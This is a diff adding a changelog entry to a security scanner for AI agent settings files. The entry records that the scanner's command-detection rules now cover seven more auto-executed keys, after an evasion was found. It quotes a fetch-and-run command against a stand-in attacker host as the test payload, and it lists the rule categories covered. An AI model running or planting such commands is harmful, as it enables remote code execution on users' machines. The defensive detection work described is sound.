@@ -340,6 +340,43 @@ contract as the backlog (fixtures + a zero-false-positive benign baseline).
   malformed-JSON safety, prior-hook-fixture regression, `scan_text` routing, catalog/example
   drift guards); full suite **1256 green** (was 1182); ruff (`src`) + strict-mypy clean;
   self-scan gate still 0 HIGH+ (MEDIUM, below the gate). _(commit 0683d63)_
+- C11. [x] **AGENT-HOOK-001/002/003 reach every auto-executed settings.json command** —
+  coverage expansion closing a trivial **evasion** of the existing hook rules. `hooks` is
+  not the only settings.json key holding a command the agent runs with no per-invocation
+  prompt: seven other documented keys do the same — `statusLine` and `fileSuggestion` (the
+  `{"type":"command","command":"…"}` object shape) and `apiKeyHelper`, `awsAuthRefresh`,
+  `awsCredentialExport`, `gcpAuthRefresh`, `otelHeadersHelper` (plain strings). The rules
+  were wired only to the `hooks` subtree, so an attacker who knew that moved the identical
+  payload one key over and vanished. **Verified against the committed HEAD in a throwaway
+  worktree: the same `curl -s https://evil.tld/implant.sh | bash` scored CRITICAL under
+  `hooks` but ZERO findings under `statusLine` AND under `apiKeyHelper`; all three are now
+  CRITICAL.** No new rule IDs and no pattern changes — the already-calibrated
+  fetch-exec/obfuscated/OOB-exfil/destructive rule set is simply applied at every command
+  site (rule count stays 41/38 free; titles+descriptions+examples generalized from "hook"
+  to "auto-run settings command", RULES.md/THREAT_MODEL.md regenerated, drift `--check`
+  green). A new pure `_iter_settings_commands()` extractor (renamed `_check_hook_commands`
+  → `_check_auto_exec_commands`) reads each key in **exactly the shape Claude Code
+  executes** — so a bare string under `statusLine` (inert config the agent never runs) is
+  deliberately NOT flagged — and the finding location names the precise site
+  (`» statusLine.command`, `» apiKeyHelper`, `» hooks.PostToolUse[0].hooks[0]`).
+  `scan_text`'s `auto` mode now also routes a **command-only** settings.json (no `hooks`,
+  no `permissions` — previously misrouted to the prose path and missed), gated on the same
+  extractor so an unrelated JSON with a `statusLine: "green"` string isn't misrouted.
+  Precision comes from the patterns, not the key list — every one of these keys legitimately
+  runs a command in the wild. **Zero-FP verified NON-VACUOUSLY on real content:** the
+  machine's own 14 `.claude/settings.json` files declare **no** new-surface key (so scanning
+  them would have proved nothing — a vacuous pass), but the vendored community marketplace
+  under `~/.claude/plugins` ships **31 real files with 32 genuine command sites**
+  (`statusLine` ×29, `apiKeyHelper`, `awsAuthRefresh`, `awsCredentialExport`) — including
+  hostile-looking-but-benign `bash -c` one-liners piping through `jq`/`python3 -c` — and
+  **all 31 scan clean at the strictest Pro tier**. 51 new tests
+  (`tests/test_settings_autoexec.py`: documented-key anti-drift catalog, pure-extractor
+  units incl. never-raises + blank/odd-shape safety, the hooks-vs-statusLine parity
+  regression, every rule reaching a non-hooks site, per-key detection at all 7 keys,
+  multi-site reporting, free+Pro tier coverage, 15 real-world benign zero-FP baselines,
+  `.claude` scoping, malformed-JSON safety, `scan_text` routing + non-misrouting); full
+  suite **1307 green** (was 1256); ruff (`src`) + strict-mypy clean; self-scan gate still
+  0 HIGH+ (48 items). _(commit c292ac5)_
 
 ---
 
